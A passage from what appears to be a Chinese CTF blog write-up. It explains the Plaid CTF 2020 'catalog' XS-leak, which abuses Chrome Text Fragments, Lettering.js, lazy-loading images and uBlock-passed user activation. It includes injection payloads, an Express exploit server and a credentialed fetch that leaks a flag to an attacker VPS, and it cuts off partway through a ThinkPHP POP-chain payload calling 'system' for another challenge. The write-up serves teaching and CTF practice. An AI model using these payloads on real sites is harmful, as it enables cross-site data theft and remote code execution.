scroll to it, though this consumes the user activation. If you could search for a letter at a time, then you could use your injection to add a bunch of whitespace and a lazy-loading image to detect the scroll.It turns out you can: the whole-word match counts tag boundaries as word boundaries, and the &lt;em&gt; tag gets split into a &lt;span&gt; for each individual letter on load! So you can do text searches of the form #:~:text=F-,{,-X for example to search for an X at the beginning of the flag. You can specify multiple text searches to do a binary search across the whole alphabet. Also include a meta refresh to send back offsite again after a short delay and you can leak ~5 characters per captcha. Repeat 5 or 6 times to get the whole flag. 这一段是赛后 @bluepichu 在 irc 上说的一段话，也算是对 catalog 这道题目的分析，也算是简短的 wp 。 同时，@lbherrera_ 在赛后发了一个推特公开了他一部分本题的 exp : Exp 地址在: https://gist.github.com/lbherrera/2057d53e7571cde12781758da108a76b 但是比较遗憾的是，该作者到目前为止还并未发布他自己的 write up ，如果大家能看懂这些，那么这个题后面的部分大家就可以直接跳过了，后文也就是基本按照这个大致的思路来分析这个题的。 User Activation这部分由于自己的理解也不是特别深刻，所以只是比较粗浅的个人理解，如有错误，还请师傅直接指出。 本部分参考主要是两个文档：User Activation v2、User Activation v2 (UAv2)，如果师傅们对英文阅读理解比较好，更建议看原文 ‘User Activation’ 这个词看起来比较的关键，出现在了作者的解释以及 hint 当中，但是为什么作者放 hint 要特意给 ‘User Activation’ 这个词而不是相对于更像通俗的 ‘User Interaction’ 呢？ 随便搜一下我们可以知道 ‘User Activation’ 其实算是一个术语： ​ User activation is the mechanism to maintain active-user-interaction state that limits use of “abusable” APIs (e.g. opening popups or vibrating). 简而言之，User Activation(我们暂且称为“用户激活状态”)，是为了保持用户主动进行交互的状态，限制了一些被恶意使用的 API ，比如弹窗或者震动。”激活 “状态通常意味着用户当前通过某种输入机制（打字、点击鼠标等）与页面进行交互，或者用户在页面加载后完成了某种交互。 浏览器通过用户激活这种状态来控制对被恶意使用的 API 访问，这种 API 最明显的例子就是通过window.open()打开弹出窗口。当出现一些流氓开发者开始恶意使用该 API 任意弹窗后，大多数浏览器加入了在用户未主动与页面交互时阻止弹窗的功能，从那时起，浏览器逐渐使许多其他 API 依赖于用户激活（更准确地说，使它们受用户激活控制），比如全屏、震动，自动播放媒体等， Chrome 中约有30种不同的 API 由用户激活控制。 uBlock uBlock Origin (or uBlock₀) is not an ad blocker; it’s a general-purpose blocker. uBlock Origin blocks ads through its support of the Adblock Plus filter syntax. uBlock Origin extends the syntax and is designed to work with custom rules and filters. Furthermore, advanced mode allows uBlock Origin to work in default-deny mode, which mode will cause all 3rd-party network requests to be blocked by default, unless allowed by the user. 简单来说，uBlock 是一个通用的 blocker ，通过各种自定义规则来配合过滤页面元素，更多的可以到 uBlock 仓库查看。 个人也并没有非常理解作者在此处引入 uBlock 的点，以及配合 User Activation 的出题意图，虽然作者解释了他的出题意图： Hint 1 + inclusion of uBlock: admin clicks on a link which gives a user activation to the active frame, uBlock sends a postMessage to its extension iframe, which duplicates the user activation. Whenever a page loads, the frontend gets a postMessage from the uBlock frame, and thus duplicates the activation back again. 就在我写这段话的时候我幡然醒悟，这个 uBlock 的引入对传递 User Activation 极为重要，为什么这么说呢？因为它对于我们接下里要引入的一个概念有着十分重要的联系！所以这里暂且我们把 uBlock + User Activation 的概念以及利用放一放，我们接下来看看怎么获取 flag 。 How to get the FLAG 存在 CSP 限制 Admin 会点击我们的 issue 链接 Flag 在同域的另一个页面：http://catalog.pwni.ng/issue.php?id=3 我们可以由 1) 知道，一些利用 scirpt 的跳转就失效了，但是我们可以利用如下形式进行页面跳转： 1&lt;meta http-equiv=\"refresh\" content=\"0;URL='http://url/'\" /&gt; 我们可以利用的是两个 HTML 注入，而且 image url 处的注入还是存储型的。 假设如果允许我们执行 script 代码的话，我们可以利用两个 iframe ，一个 iframe 指向我们可以执行的 js 页面，另外一个 iframe 指向 flag 的页面，通过 js 来获取同域下的另一个 iframe 的内容，这也算是常用的 csrf 的一种操作，可以参考 Byte Bandits CTF 2020 - Notes App 的解法，这里就不再赘述了。 如果能插入 script 执行就好了，可惜插不得。 Text Fragments反手看一手 Chrome 新特性，闷声发大财。 众所周知，CTF 出题人会有事没事去看看 php 源码 or chrome new features ，所以：New in Chrome 80 Of course, there’s plenty more! You can now link directly to text fragments on a page, by using #:~:text=something. Chrome will scroll to and highlight the first instance of that text fragment. For example [https://en.wikipedia.org/wiki/Rickrolling#:~:text=New%20York](https://en.wikipedia.org/wiki/Rickrolling#:~:text=New York) Scroll To Text Fragment: https://chromestatus.com/feature/4733392803332096 ​ This feature allows a user or author to link to a specific portion of a page, using a text snippet provided in the URL. When the page is loaded, the browser highlights the text and scrolls it into view. 简单来说，Chrome 在今年2月份的更新推出了一个新特性，这个特性能让我们用形如#:~:text=something的样式来滑动到该页面something字符串的位置，并将其高亮，赋予了字符串类似一个 anchor 锚标签的作用。 具体的使用师傅们可以参考文档 Text Fragments ，这里我只择取我们需要的来说： 匹配模式： 12#:~:text=[prefix-,]textStart[,textEnd][,-suffix] context |-------match-----| context 前缀跟跟后缀只是为了限制上下文，真正匹配的还是中间的 textStart &amp; textEnd 需要完整匹配一个单词，无法匹配单词中的单个字母。 Example 12 “range” will match in “mountain range” but not in “color orange” nor “forest ranger”. 单词需要在一个完整的块里面： Example 11 1:~:text=The quick,lazy dog will fail to match in 12&lt;div&gt;The&lt;div&gt; &lt;/div&gt;quick brown fox&lt;/div&gt;&lt;div&gt;jumped over the lazy dog&lt;/div&gt; because the starting string “The quick” does not appear within a single, uninterrupted block. The instance of “The quick” in the document has a block element between “The” and “quick”. It does, however, match in this example: 12&lt;div&gt;The quick brown fox&lt;/div&gt;&lt;div&gt;jumped over the lazy dog&lt;/div&gt; 所以我们可以有个想法利用这个新特性去匹配到 flag ，但是一系列的问题来了： 如果 flag 是 PCTF{TEST} ，我们用#:~:text=P-,C,T,-F是匹配不到的，因为它不能匹配到单词的单个字母 即使我们能匹配到了，怎么样判断我们匹配到了呢？ Lettering按照上述思路，我们貌似得找个办法拆分这个字符串，其实出题人已经很贴心地为我们做好了： 这是页面所引入的文件： 1234&lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js\" nonce=\"Lb+i9i7nwe2rCiMsSCig2ovMYVix6gu0\"&gt;&lt;/script&gt;&lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/lettering.js/0.7.0/jquery.lettering.min.js\" nonce=\"Lb+i9i7nwe2rCiMsSCig2ovMYVix6gu0\"&gt;&lt;/script&gt;&lt;script src=\"https://www.google.com/recaptcha/api.js?render=6LcdheoUAAAAAOxUsM86wQa5c_wiDak2NnMIzO7Y\" nonce=\"Lb+i9i7nwe2rCiMsSCig2ovMYVix6gu0\"&gt;&lt;/script&gt;&lt;script src=\"/js/main.js\" nonce=\"Lb+i9i7nwe2rCiMsSCig2ovMYVix6gu0\"&gt;&lt;/script&gt; 其中引入了 jquery.lettering.min.js ，并且 main.js 有如下代码 1$(\"em\").lettering(); 我们可以在 lettering.js 的文档中看到 Lettering.js wiki - Wrapping letters with lettering() We’ll start with some really basic markup: 1&lt;h1 class=\"fancy_title\"&gt;Some Title&lt;/h1&gt; After including jQuery, download and include the latest minified version of Lettering.js, then a script block with the magical .lettering() method: 1234567&lt;script src=\"path/to/jquery.min.js\"&gt;&lt;/script&gt;&lt;script src=\"path/to/jquery.lettering.min.js\"&gt;&lt;/script&gt;&lt;script&gt;$(document).ready(function() { $(\".fancy_title\").lettering();});&lt;/script&gt; The resulting code will churn your .fancy_title and output the following: 123456789101112&lt;h1 class=\"fancy_title\"&gt; &lt;span class=\"char1\"&gt;S&lt;/span&gt; &lt;span class=\"char2\"&gt;o&lt;/span&gt; &lt;span class=\"char3\"&gt;m&lt;/span&gt; &lt;span class=\"char4\"&gt;e&lt;/span&gt; &lt;span class=\"char5\"&gt;&lt;/span&gt; &lt;span class=\"char6\"&gt;T&lt;/span&gt; &lt;span class=\"char7\"&gt;i&lt;/span&gt; &lt;span class=\"char8\"&gt;t&lt;/span&gt; &lt;span class=\"char9\"&gt;l&lt;/span&gt; &lt;span class=\"char10\"&gt;e&lt;/span&gt;&lt;/h1&gt; 所以我们只需要在页面加入一个&lt;em&gt;标签，即可把内容拆分为单个字母，效果如下： 所以这时候我们就可以利用#:~:text=P-,C,T,-F进行选中了。 Spark Thinking那么如何判断我们是否选中了呢？ 这里 Exp 作者很聪明地想到了一个办法： 利用我们在 information 段提到的同一 session 会存储一定的 HTML 元素，所以即使登录状态下，我们也可以利用 fetch no-cors 来更新界面，利用登录失败在另一个同一 session 的界面得到无过滤的 HTML 注入 利用这个登录失败的 HTML 注入创造判断条件：注入足够多的&lt;br&gt;标签，让 FLAG 位于用户视窗页面之外，并在&lt;br&gt;的最后加入一个图片，利用图片懒加载来确定 Text Fragments 是否匹配到了 FLAG 一开始因为图片被放置到了用户视窗之外并且由于图片懒加载，图片并不会请求对应的资源，这时如果#:~:text=P-,C,T,-F匹配到了，因为我们注入的&lt;br&gt;标签的原因，页面会先进行滚动到 FLAG 的位置，这时候，图片才会加载对应的资源，所以我们就可以利用图片懒加载来确定匹配成功；如果匹配不成功的话，就不会请求对应的资源 所以这时我们只需要利用自己的 vps 监听一个端口让懒加载的图片在触发请求时，请求我们的 vps 就可以判断是否匹配成功了 Note: Support the ‘loading’ attribute, which can be used to defer the load of below-the-fold iframes and images on the page until the user scrolls near them. This is to reduce data usage, memory usage, and to speed up above-the-fold content. Web developers can opt-in to lazy load by specifying loading=lazy on &lt;iframe&gt; and &lt;img&gt; elements. 也就是说只有当用户窗口页面内关注到&lt;img&gt;标签时，该标签才能加载对应的资源。我们可以使用&lt;img&gt;原生属性loading=lazy来实现，Chrome 76以后的版本都已实现了该功能——Lazily load iframes and images via ‘loading’ attribute 至此，基本上比较关键的地方我们都说完了，剩下的就是实现以及一些细节的地方了。 uBlock &amp; User Activation &amp; Text Fragments这时我们再来回头看 uBlock &amp; User Activation 在整个过程起到了什么作用呢？ 因为 Chrome 80 引入了 Text Fragments 的机制，综上我们的分析利用可以产生一个新的攻击面，用这种“侧信道”的攻击方式我们可以窃取用户隐私，所以当然出于隐私考虑， Google 也引入了相对的限制机制： The following subsections restrict the feature to mitigate the expected attack vectors. In summary, the text fragment directives are invoked only on full (non-same-page) navigations that are the result of a user activation. Additionally, navigations originating from a different origin than the destination will require the navigation to take place in a “noopener” context, such that the destination page is known to be sufficiently isolated. 我们可以注意到其中非常关键的一句话： *In summary, the text fragment directives are invoked only on full navigations that are the result of a user activation. * 也就是说 Text Fragments 功能仅在由于 User Activation 产生的完整导向上才能生效，没有 User Activation 是无法使用该功能的！在其他地方我们也可以看到 Google 对于 *User Activation * 做了很多的强调： The examples above illustrate that in specific circumstances, it may be possible for an attacker to extract 1 bit of information about content on the page. However, care must be taken so that such opportunities cannot be exploited to extract arbitrary content from the page by repeating the attack. For this reason, restrictions based on user activation and browsing context isolation are very important and must be implemented. For this reason, restrictions based on user activation and browsing context isolation are very important and must be implemented. 因此，基于 User Activation 和浏览上下文隔离的限制非常重要，必须予以实施。 至于 Chrome 如何实现限制该功能的，具体可以参考文档 Restricting the Text Fragment ，这里就不详述了。 从以上来看，出题人的题图就很明显了： Hint 1 + inclusion of uBlock: admin clicks on a link which gives a user activation to the active frame, uBlock sends a postMessage to its extension iframe, which duplicates the user activation. 并且根据 User Activation v2 in Chrome ： Full-overlay request from subframes: To grant a subframe’s full-overlay request (sent through a postMessage), the main frame will check the subframe’s HasConsumableUserActivation bit and will consume it. If we expose the frame states through read-only Boolean properties of HTMLIFrameElement (or Document), the main frame can access the info through the postMessage’s event source parameter. 两者结合在一起可能就比较容易理解了，以下是个人根据文档理解，并没有参考研究具体代码实现，如果有师傅根据代码研究出结果与我的理解有什么出入，那一定是我错了： 个人理解：管理员单击一个我们提交打的链接，将消耗一个用户激活打开链接，而 uBlock 将 postMessage 发送到其扩展 iframe ，从而复制用户激活。 每当页面加载时，前端都会从 uBlock 框架获取 postMessage ，从而再次将激活复制回去。 我们可以从 Verification 看到关于 uBlock 传递 User Activation 的验证。 Regex因为 FLAG 正则为 /^PCTF\\{[A-Z0-9_]+\\}$/，我们每次用 Text Fragments 只能验证一个字符，例如我们可以构造如下 url ，一次可以匹配完全部的符合正则的字符，A-Z0-9_ 外加一个 } 为 FLAG 闭合的字符 1http://catalog.pwni.ng/issue.php?id=3#:~:text=T-,F,{,-}%26text=T-,F,{,-0%26text=T-,F,{,-1%26text=T-,F,{,-2%26text=T-,F,{,-3%26text=T-,F,{,-4%26text=T-,F,{,-5%26text=T-,F,{,-6%26text=T-,F,{,-7%26text=T-,F,{,-8%26text=T-,F,{,-9%26text=T-,F,{,-A%26text=T-,F,{,-B%26text=T-,F,{,-D%26text=T-,F,{,-E%26text=T-,F,{,-F%26text=T-,F,{,-G%26text=T-,F,{,-H%26text=T-,F,{,-I%26text=T-,F,{,-J%26text=T-,F,{,-K%26text=T-,F,{,-L%26text=T-,F,{,-M%26text=T-,F,{,-N%26text=T-,F,{,-O%26text=T-,F,{,-P%26text=T-,F,{,-Q%26text=T-,F,{,-R%26text=T-,F,{,-S%26text=T-,F,{,-T%26text=T-,F,{,-U%26text=T-,F,{,-V%26text=T-,F,{,-W%26text=T-,F,{,-X%26text=T-,F,{,-Y%26text=T-,F,{,-Z%26text=T-,F,{,-_ 如果匹配了，则去掉一半的字符，采用二分的形式缩小我们的匹配范围，所以下一次我们可以发送的是 1http://catalog.pwni.ng/issue.php?id=3#:~:text=T-,F,{,-}%26text=T-,F,{,-0%26text=T-,F,{,-1%26text=T-,F,{,-2%26text=T-,F,{,-3%26text=T-,F,{,-4%26text=T-,F,{,-5%26text=T-,F,{,-6%26text=T-,F,{,-7%26text=T-,F,{,-8%26text=T-,F,{,-9%26text=T-,F,{,-A%26text=T-,F,{,-B%26text=T-,F,{,-D%26text=T-,F,{,-E%26text=T-,F,{,-F%26text=T-,F,{,-G%26text=T-,F,{,-H%26text=T-,F,{,-I 如果匹配了，就继续在这个范围二分，不匹配就用另一个范围 Reproduce这个部分就只是提供复现的步骤，下个部分提供详细的攻击链解释： 注册一个账号，创建一个 issue ，并记录该 issue 的数字 id，为了方便辨识，该数字 id 我们称为 issue_id_1 ，post http 包的 body 内容为： 1id=issue_id_1&amp;title=3&amp;content=1&amp;image=z\"/&gt;&lt;img src=\"http://your_vps/fragment\"&gt;&lt;meta http-equiv=\"refresh\"+content=\"0;URL='http://catalog.pwni.ng/issue.php?id=3#:~:text=T-,F,{,-}%26text=T-,F,{,-0%26text=T-,F,{,-1%26text=T-,F,{,-2%26text=T-,F,{,-3%26text=T-,F,{,-4%26text=T-,F,{,-5%26text=T-,F,{,-6%26text=T-,F,{,-7%26text=T-,F,{,-8%26text=T-,F,{,-9%26text=T-,F,{,-A%26text=T-,F,{,-B%26text=T-,F,{,-D%26text=T-,F,{,-E%26text=T-,F,{,-F%26text=T-,F,{,-G%26text=T-,F,{,-H%26text=T-,F,{,-I%26text=T-,F,{,-J%26text=T-,F,{,-K%26text=T-,F,{,-L%26text=T-,F,{,-M%26text=T-,F,{,-N%26text=T-,F,{,-O%26text=T-,F,{,-P%26text=T-,F,{,-Q%26text=T-,F,{,-R%26text=T-,F,{,-S%26text=T-,F,{,-T%26text=T-,F,{,-U%26text=T-,F,{,-V%26text=T-,F,{,-W%26text=T-,F,{,-X%26text=T-,F,{,-Y%26text=T-,F,{,-Z%26text=T-,F,{,-_'\"&gt; 再创建一个 issue ， 并记录该 issue 的数字 id，为了方便辨识，该数字 id 我们称为 issue_id_2，post http 包的 body 内容为： 1id=issue_id_2&amp;title=3&amp;content=1&amp;image=\"&gt;&lt;meta http-equiv=\"refresh\" content=\"0;URL='http://your_vps/'\"&gt;\" 自己的 vps 上用 node 运行如下 exp.js 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758const express = require(\"express\");const app = express();let status = false;let unlock = false;let match = false;app.get(\"/status\", (req, res) =&gt; { res.send(`${status}`);});app.get(\"/unlock\", (req, res) =&gt; { unlock = true; res.send(\"unlock\");});app.get(\"/firstload\", (req, res) =&gt; { console.log(\"==&gt; Admin opened challenge's page\"); res.send(\"firstload\");});app.get(\"/\", (req, res) =&gt; { console.log(\"==&gt; Admin was redirected to attacker's page\"); res.sendFile(\"index.html\", { root: __dirname });});app.get(\"/injection\", (req, res) =&gt; { console.log(\"==&gt; HTML injection was inserted into id=3 catalog\"); setTimeout(() =&gt; { if (match) console.log(\"==&gt; There was a match\"); else console.log(\"==&gt; There wasn't a match\"); match = false; unlock = false; status = false; }, 1000); res.send(\"injection\");});app.get(\"/exfiltrated\", (req, res) =&gt; { match = true; res.send(\"exfiltrated\");});app.get(\"/fragment\", (req, res) =&gt; { status = true; console.log(\"==&gt; Admin was fragmented\"); let timer = setInterval(async () =&gt; { if (unlock) { res.send(\"fragment\"); clearInterval(timer); } }, 1);});app.listen(port);console.log(\"Server running on port: \" + port); index.html: 1234567891011121314151617181920212223242526272829&lt;html&gt; &lt;head&gt; &lt;title&gt;Psst! Get out of here...&lt;/title&gt; &lt;script&gt; const next = async () =&gt; { let res = await fetch(\"/status\"); let status = await res.text(); if (status === \"true\") { await fetch(\"http://catalog.pwni.ng/user.php\", { \"headers\": { \"content-type\": \"application/x-www-form-urlencoded\", }, \"body\": `username=\"/&gt;&lt;img src=\"http://your_vps/injection\"&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;div align=\"left\"&gt;&lt;img src=\"http://your_vps/exfiltrated\" loading=\"lazy\"&gt;&lt;/div&gt;&lt;em&gt;&amp;password=1&amp;action=login`, \"method\": \"POST\", \"mode\": \"no-cors\", \"credentials\": \"include\" }); await fetch(\"/unlock\"); } else { next(); } } next(); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;iframe src=\"http://catalog.pwni.ng/issue.php?id=issue_id_1\" style=\"position: absolute; width: 400%; height: 500px; border: 0\"&gt;&lt;/iframe&gt; &lt;/body&gt;&lt;/html&gt; 其中your_vps处替换为你的 vps 地址，issue_id_1 替换为之前的数字 id 随便 report 一个 issue 给 admin 并抓包修改内容，把 id 字段改成 issue_id_2 即可。 1id=19902&amp;token=03AGdBq26Abe5GL1dxt9c1N1n03hjoiUv1KCzn6o6VII3LGYY2JBKZLrVU5I7KxViJW8X87Nt_PJOFxyHpIFq_wq0Xph-SyP5dQTvu-s5k3AePCPKo8lMurhTM1V1Af_RdPImnBoGZb6Nm6YcilLNLeHLbGbDj7XPFCHqjdSq1zyJA7Luam8SlPzgPJOOPJYz65fXRPtn0GVunipJNjiXbXtvPKTJjPVat784uRrCQ47aHuWXnxyipstDGkZj0-iujm9k-L51EUDv9FbW4kEULU0_nDwVgtIc5ZniVcIVgupcpfGAagCLMyKGfDsFho9U4BHsdqsc7918PNyeSrcbPN7gmq_aLJRTGx6bICHnzHzaKNB5yakec0YsC1CQzLhtqqZhTQvEJNREkXvBHZ7PlYXdypNCNSCwI_g token 是 Google 验证码用于验证的 token ，这个 token 你可以另开一个题目地址，并打开控制台输入以下代码（这段代码可以在题目 main.js 拿到）即可： 123456grecaptcha.ready(async () =&gt; { let token = await grecaptcha.execute(\"6LcdheoUAAAAAOxUsM86wQa5c_wiDak2NnMIzO7Y\", { action: \"report\" }); console.log(token);}); 如果 vps 收到了 match ，就在该范围继续二分，不然就在另一个范围继续二分，重复1-4步骤即可 Detailed Attack Chain好了，现在我们就来整理一下全部信息，以及说一下详细的攻击流程： 首先 admin 会点击我们提交的第二个 issue ，然后因为第二个 issue_2 内容存在 1&lt;meta http-equiv=\"refresh\" content=\"0;URL='http://your_vps/'\"&gt;\" 会跳转到我们 vps 主页面 这时 admin 会加载 index.html ，此时 iframe 会请求第一个 issue_1 页面，并且发送请求 http://your_vps/status ，最初始化的时候因为let status = false;，而 js 还有一个 status 的判断 1234let status = await res.text();if (status === \"true\") { //...} 所以 script 里面的流程会一直等待status的变化，实现了一个类似于锁一样的功能，我们这里就称为 status 锁，而解锁这个锁的条件就是当 iframe 里面的 issue_1 完全加载完毕。 当 iframe 中的 issue_1 完全加载完毕，此时 issue_1 界面里面还有一个 img 标签用于解锁 status 锁 1&lt;img src=\"http://your_vps/fragment\"&gt;&lt;meta http-equiv=\"refresh\"+content=\"0;URL='http://catalog.pwni.ng/issue.php?id=3#...\"&gt; 此时会请求我们 http://your_vps/fragment 12345678910app.get(\"/fragment\", (req, res) =&gt; { status = true; console.log(\"==&gt; Admin was fragmented\"); let timer = setInterval(async () =&gt; { if (unlock) { res.send(\"fragment\"); clearInterval(timer); } }, 1);}); 该路由解锁了 status 锁，并创建了一个计时器等待 unlock 来解除，我们称为 fragment 锁，表示 admin 已经加载了 iframe 。 这是因为 fragment 锁的原因，iframe 当中的页面等待在 issue_1 界面等待 fragment 锁的解锁，而当 status 锁解锁，会立马触发 index.html 当中的 fetch 请求 123456789await fetch(\"http://catalog.pwni.ng/user.php\", { \"headers\": { \"content-type\": \"application/x-www-form-urlencoded\", }, \"body\": `username=\"/&gt;&lt;img src=\"http://your_vps/injection\"&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;div align=\"left\"&gt;&lt;img src=\"http://your_vps/exfiltrated\" loading=\"lazy\"&gt;&lt;/div&gt;&lt;em&gt;&amp;password=1&amp;action=login`, \"method\": \"POST\", \"mode\": \"no-cors\", \"credentials\": \"include\"}); 这时因为还是 admin 的 session ，所以 admin session 存储的 HTML 元素会变成我们登录失败的 HTML 元素 接着 index.html 执行await fetch(\"/unlock\");， 1234app.get(\"/unlock\", (req, res) =&gt; { unlock = true; res.send(\"unlock\");}); unlock 路由将 unlock 置为 true，清除了 fragment 路由当中的计时器，解锁 fragment 锁，此时 iframe 当中的 issue_1 界面可以完成全部加载，并因为&lt;meta&gt;标签的作用跳转到了包含有 FLAG 并且有 Text Fragemnt 功能的页面 此时 FLAG 页面还是 admin session 的关系，会读取上一轮我们登录失败的 HTML 元素也就是注入了很多&lt;br&gt;标签的元素，这样就完成了将 FLAG 挤出用户视窗界面的操作，并由于 uBlock 传递了 User Activation 激活了 Text Fragment 功能，将会在页面进行匹配 FLAG 字符 一加载完界面首先会因为&lt;img src=\"http://your_vps/injection\"&gt;，请求到 injection 路由 1234567891011app.get(\"/injection\", (req, res) =&gt; { console.log(\"==&gt; HTML injection was inserted into id=3 catalog\"); setTimeout(() =&gt; { if (match) console.log(\"==&gt; There was a match\"); else console.log(\"==&gt; There wasn't a match\"); match = false; unlock = false; status = false; }, 1000); res.send(\"injection\");}); 此时会有一个 1s 延时等待，这个等待就是为了等待 Text Fragments 是否匹配到 FLAG的判断 如果 Text Fragments 匹配到了，就会触发滚动，用户视窗滚动到 FLAG 处，触发请求懒加载的图片&lt;img src=\"http://your_vps/exfiltrated\" loading=\"lazy\"&gt;，请求到 exfiltrated 路由 1234app.get(\"/exfiltrated\", (req, res) =&gt; { match = true; res.send(\"exfiltrated\");}); 此时将 match 设置为 true ，让 injection 完成我们的判断回显。 整个攻击流程大致就这样，图就懒得画了，因为整个题目以及 wrtieup 耗费了我不少的时间，涉及到的技术都分析完了，剩下就是重复 leak FLAG 了。（问了作者，FLAG 一共 38 位… Other这里写一点题外话 postMessage关于 uBlock 使用 postMessage 复制 User Activation 的方法我仍然表示存疑，因为自己根据阅读的文档，postMessage传递 User Activation 需要有对应的配置，例如： 1window.parent.postMessage('resize', {includeUserActivation: true}); 但是我并没有在 uBlock 看到相关的配置，postMessage都是使用的默认配置，然后关于默认配置我也查看了部分 Chromium 的源码，对于 UserActivation 默认配置是 false 的 但是我们通过 Verification 环节测试得到的结果确实需要 uBlock 来进行，由于自己时间并不是特别多，最近花太多时间在这题的复盘上，所以最近不打算再深究这部分的内容了，这部分的内容不仅涉及到 User Activation ，还涉及到一些关于 User Activation 抽象模型的代码实现，如果要深究的话就需要花比较多的时间了。 Verification至于验证为什么一定需要 uBlock 来参与，这部分验证也比较简单，就是自己创建一个 issue ，内容设置为一个用于测试的 FLAG，比如 PCTF{TEST} ，其他的跟 EXP 过程差不多，只需要把 FLAG 的地址换为自己测试 FLAG 的地址即可，然后可以通过关闭 Chrome 拓展 uBlock 来测一遍（最好是从 Chrome 拓展关闭，使用拓展本身的关闭并不是全站关闭），多测试几次就会发现确实需要引入 uBlock 来实现 Leak Data 。 Text Fragment这里其实比较可惜的是 @wupco 师傅，他之前关注到了这个 chrome Text Fragment 的功能，并且也引起了他的注意是否可以利用#:~:text=flag{this_is_a_flag}的形式 leak data ，可惜他表示比赛的时候没有想起来。（不愧是老 CTFer ，一开口就知道是老 CTFer 了 ​ How about using #:~:text=flag{this_is_a_flag} and onscroll to leak data? Other Web Challanges这次比赛的 Web 都比较有意思，Contrived Web Problem 是一道 FTP 到 SSRF 的利用链，wp 可以看我的博客，但是只有英文部分，并且没有完整的 payload ，只聊了聊大致的思路，而且英文水平可能比较拙，不知道以后自己有没有空写中文的，自己也不太确定。 Mooz Chat 听 @wupco 师傅说是一个中间人劫持的 web 题，（太强大了，需要逆向，表示单凭自己弄不了），但是中间人劫持的题目确实令人耳目一新！如果师傅们有相关的思路或者 wp 欢迎一起交流！ Conclusion这次比赛的题个人觉得还是比较偏“侧信道”的，这类的题目我都觉得非常好玩，因为不同于传统的 Web 攻击，还通常引入了很多比较新的理念与攻击链，虽然 User Activation 相关的部分还没有完全弄明白，而且这个题作者还是故意引入的 uBlock 来协助我们做题，也算是比较的友好了，只不过可能我们没有完全 Get 到出题人的点。所以这次比赛对我而言更让人觉得耳目一新的是 Chrome 新特性 Text Fragemnts ，让人研究的更多的是 User Activation 。 虽然这种题目对于实战可能显得鸡肋，甚至“毫无作用”，但是这类题目我觉得打开了自己的视野，让我关注到了更多新东西，更何况这类的题目在国内还是很少见到的，毕竟弄这类题目，从主要攻击链构造到细节设置都需要精心的揣摩与推敲，更何况是“侧信道”的题目，没有深厚的技术积淀出不来这类让全球大部分 CTFer 爆零的高难度的题目，也希望国内以后能出现一些这类高质量的题目吧。 ReferencesUser Activation v2 User Activation v2 (UAv2) Making user activation consistent across APIs Existing Chrome APIs using user gestures JS API for querying User Activation Activation Transfer through postMessages","link":"/2020/04/24/Plaid-CTF-2020-Web-2/"},{"title":"Red Hat 2019 Web Write Up","text":"红帽杯 2019 Web Write Up (除 iCloudMusic [TOC] Ticket_SystemXXE 2 Phar 反序列化加 Nu1lCTF sql_manager 的 thinkphp pop 链就行了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263&lt;?phpnamespace think\\process\\pipes { class Windows { private $files; public function __construct($files) { $this-&gt;files = array($files); } }}namespace think\\model\\concern { trait Conversion { protected $append = array(\"Zedd\" =&gt; \"1\"); } trait Attribute { private $data; private $withAttr = array(\"Zedd\" =&gt; \"system\"); public function get($system) { 